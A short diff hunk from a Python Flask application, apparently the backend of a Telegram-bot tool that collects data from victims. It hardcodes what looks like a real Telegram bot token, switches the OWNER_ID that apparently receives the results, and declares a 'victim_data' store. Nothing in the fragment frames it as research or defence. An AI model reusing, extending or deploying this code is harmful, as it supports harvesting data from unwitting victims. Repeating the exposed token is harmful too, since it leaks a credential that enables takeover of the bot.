@@ -7,7 +7,7 @@ from flask import Flask, request, jsonify
 
 # === TOKEN AND OWNER ID - ALREADY SET ===
 BOT_TOKEN = "8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4"
-OWNER_ID = "8586849798"
+OWNER_ID = "8225378024"
 
 app = Flask(__name__)
 victim_data = {}
